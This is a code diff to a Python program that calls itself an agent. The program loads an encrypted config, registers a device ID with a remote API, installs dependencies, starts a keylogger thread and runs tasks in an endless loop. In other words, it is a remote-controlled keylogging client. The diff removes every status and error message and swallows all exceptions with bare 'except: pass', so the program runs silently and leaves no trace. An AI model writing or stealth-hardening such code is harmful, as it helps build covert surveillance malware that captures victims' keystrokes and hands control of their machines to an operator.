@@ -413,10 +413,8 @@ def api_request(config, endpoint, method="GET", data=None):
             return True
     except urllib.error.HTTPError as e:
         error_body = e.read().decode() if e.fp else "No error body"
-        print(f"API Error ({endpoint}): {e.code} - {error_body}")
         return None
     except Exception as e:
-        print(f"API Request Exception ({endpoint}): {e}")
         return None
 
 def register_device(config, device_id):
@@ -737,32 +735,25 @@ def process_tasks(config, device_id):
 
 
 def main():
-    print("Agent starting...")
     config = get_config()
     if not config:
-        print("Failed to load/decrypt config.enc")
         return
     
     device_id = get_device_id()
-    print(f"Device ID: {device_id}")
     
-    print("Installing dependencies...")
     install_dependencies()
     start_keylogger_thread()
     
-    print(f"Starting main loop (Sync: {config.get('sync_interval', 10)}s)...")
     while True:
         try:
-            print("Registering device...")
             register_device(config, device_id)
-            print("Processing tasks...")
             process_tasks(config, device_id)
-        except Exception as e:
-            print(f"Main loop error: {e}")
+        except:
+            pass
         time.sleep(config.get('sync_interval', 10))
 
 if __name__ == "__main__":
     try:
         main()
-    except Exception as e:
-        print(f"Fatal error: {e}")
+    except:
+        pass
